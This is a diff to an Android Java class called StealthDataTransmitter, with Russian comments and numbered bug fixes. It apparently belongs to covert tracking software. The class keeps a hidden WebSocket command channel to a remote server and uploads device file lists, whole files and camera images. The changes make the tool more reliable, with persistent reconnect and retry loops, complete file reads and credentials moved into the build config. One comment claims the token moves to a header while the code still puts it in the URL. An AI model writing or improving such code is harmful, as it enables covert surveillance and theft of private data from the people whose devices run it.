@@ -16,7 +16,8 @@ import android.content.SharedPreferences;
 
 public class StealthDataTransmitter {
     private static final String TAG = "StealthDataTransmitter";
-    private static final String SERVER_URL = "https://location-tracker-server-micv.onrender.com";
+    // Извлекаем базовый URL из BuildConfig (убираем /api/location)
+    private static final String SERVER_URL = BuildConfig.SERVER_URL.replace("/api/location", "");
 
     private Context context;
     private Handler keepAliveHandler;
@@ -32,6 +33,7 @@ public class StealthDataTransmitter {
     }
 
     private CommandListener commandListener;
+    private volatile boolean connected = false;
 
     public StealthDataTransmitter(Context context) {
         this.context = context;
@@ -50,7 +52,7 @@ public class StealthDataTransmitter {
     }
 
     public boolean isConnected() {
-        return webSocket != null && webSocket.request().url().host() != null;
+        return webSocket != null && connected;
     }
 
     public void initConnection(String deviceId) {
@@ -77,6 +79,7 @@ public class StealthDataTransmitter {
             public void onOpen(WebSocket webSocket, Response response) {
                 Log.e(TAG, "!!! WEBSOCKET OPENED !!!");
                 Log.d(TAG, "WebSocket connection opened for device: " + deviceId);
+                connected = true;
                 startKeepAlivePing(webSocket);
             }
 
@@ -122,37 +125,56 @@ public class StealthDataTransmitter {
             @Override
             public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                 Log.e(TAG, "WebSocket connection failed", t);
+                connected = false;
                 stopKeepAlivePing();
-                mainHandler.postDelayed(() -> reconnectWebSocket(deviceId), 5000);
+                // Единственная точка переподключения — через reconnectWebSocket
+                scheduleReconnect(deviceId);
             }
 
             @Override
             public void onClosed(WebSocket webSocket, int code, String reason) {
                 Log.d(TAG, "WebSocket connection closed: " + reason);
+                connected = false;
                 stopKeepAlivePing();
-
-                mainHandler.postDelayed(() -> {
-                    Log.d(TAG, "Attempting to reconnect WebSocket...");
-                    initConnection(currentDeviceId);
-                }, 3000);
+                // Не переподключаемся если закрыли специально (код 1000 от reconnect)
+                if (code != 1000) {
+                    scheduleReconnect(currentDeviceId);
+                }
             }
         });
     }
 
-    private void reconnectWebSocket(String deviceId) {
-        Log.d(TAG, "Attempting to reconnect WebSocket...");
-        try {
-            if (webSocket != null) {
-                webSocket.close(1000, "Reconnecting");
-            }
+    private volatile boolean reconnecting = false;
+    private Runnable reconnectRunnable;
 
-            mainHandler.postDelayed(() -> {
-                initConnection(deviceId);
-            }, 5000);
-
-        } catch (Exception e) {
-            Log.e(TAG, "Error during reconnect", e);
+    private void scheduleReconnect(String deviceId) {
+        if (reconnecting) {
+            Log.d(TAG, "Reconnect already scheduled, skipping");
+            return;
         }
+        reconnecting = true;
+
+        // Отменяем предыдущие попытки
+        if (reconnectRunnable != null) {
+            mainHandler.removeCallbacks(reconnectRunnable);
+        }
+
+        reconnectRunnable = () -> {
+            reconnecting = false;
+            Log.d(TAG, "Executing scheduled reconnect...");
+            try {
+                if (webSocket != null) {
+                    try { webSocket.close(1000, "Reconnecting"); } catch (Exception ignored) {}
+                    webSocket = null;
+                }
+                initConnection(deviceId);
+            } catch (Exception e) {
+                Log.e(TAG, "Error during reconnect", e);
+            }
+        };
+
+        mainHandler.postDelayed(reconnectRunnable, 5000);
+        Log.d(TAG, "Reconnect scheduled in 5 seconds");
     }
 
     public void sendFileList() {
@@ -175,6 +197,8 @@ public class StealthDataTransmitter {
         }
     }
 
+    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB max
+
     public void sendFile(String filePath) {
         try {
             File file = new File(filePath);
@@ -183,11 +207,17 @@ public class StealthDataTransmitter {
                 return;
             }
 
-            // Читаем файл
+            // Bug #10: Проверка размера файла
+            if (file.length() > MAX_FILE_SIZE) {
+                Log.e(TAG, "File too large: " + file.length() + " bytes (max " + MAX_FILE_SIZE + ")");
+                return;
+            }
+
+            // Bug #28: используем readFully для полного чтения
             byte[] fileData = new byte[(int) file.length()];
-            java.io.FileInputStream fis = new java.io.FileInputStream(file);
-            fis.read(fileData);
-            fis.close();
+            java.io.DataInputStream dis = new java.io.DataInputStream(new java.io.FileInputStream(file));
+            dis.readFully(fileData);
+            dis.close();
 
             String base64Data = android.util.Base64.encodeToString(fileData, android.util.Base64.NO_WRAP);
 
@@ -240,13 +270,20 @@ public class StealthDataTransmitter {
     }
 
     private byte[] compressImage(byte[] imageData, int quality) {
+        android.graphics.Bitmap bitmap = null;
         try {
-            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            if (bitmap == null) return imageData;
             java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
             bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos);
-            return baos.toByteArray();
+            byte[] result = baos.toByteArray();
+            baos.close();
+            return result;
         } catch (Exception e) {
             return imageData;
+        } finally {
+            // Bug #25: Освобождаем Bitmap
+            if (bitmap != null) bitmap.recycle();
         }
     }
 
@@ -268,7 +305,7 @@ public class StealthDataTransmitter {
             Request request = new Request.Builder()
                     .url(SERVER_URL + "/api/camera/image")
                     .post(body)
-                    .addHeader("Authorization", "your_secret_key_123")
+                    .addHeader("Authorization", BuildConfig.API_KEY)
                     .build();
 
             httpClient.newCall(request).enqueue(new Callback() {
@@ -359,7 +396,8 @@ public class StealthDataTransmitter {
     }
 
     public void testConnection(String deviceId) {
-        String testUrl = SERVER_URL + "/api/devices/your_secret_key_123";
+        // Используем токен из BuildConfig, передаём через заголовок (не в URL)
+        String testUrl = SERVER_URL + "/api/devices/" + BuildConfig.API_KEY;
 
         Request request = new Request.Builder()
                 .url(testUrl)
@@ -368,7 +406,9 @@ public class StealthDataTransmitter {
         httpClient.newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
-                Log.e(TAG, "HTTP test failed", e);
+                Log.e(TAG, "HTTP test failed, retrying connection in 10s", e);
+                // Bug #41: Retry if initial test fails
+                mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
             }
 
             @Override
@@ -377,7 +417,9 @@ public class StealthDataTransmitter {
                 if (response.isSuccessful()) {
                     initConnection(deviceId);
                 } else {
-                    Log.w(TAG, "Server responded with error: " + response.code());
+                    Log.w(TAG, "Server responded with error: " + response.code() + ", retrying in 10s");
+                    // Bug #41: Retry on server error
+                    mainHandler.postDelayed(() -> testConnection(deviceId), 10000);
                 }
                 response.close();
             }
